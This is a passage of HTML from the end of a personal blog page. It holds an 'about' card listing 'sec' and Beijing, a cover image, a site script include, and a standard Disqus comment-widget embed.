                <i class="fa fa-briefcase"></i>
                <br/>
                <p>sec</p>

            </h5>
        
        
            <h5 id="about-card-location">
                <i class="fa fa-map-marker"></i>
                <br/>
                北京· 中国
            </h5>
        
    </div>
</div>

        <div id="cover" style="background-image:url('http://img.ycg.qq.com/201832/0/2cdc84a0-b5f2-4c9c-8870-e8bce75d4f89/preview');"></div>
    </body>
    <!--SCRIPTS-->
<script src="/assets/js/script.min.js"></script>
<!--SCRIPTS END-->

    <script type="text/javascript">
        var disqus_shortname = 'craymc';
        (function() {
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>



</html>
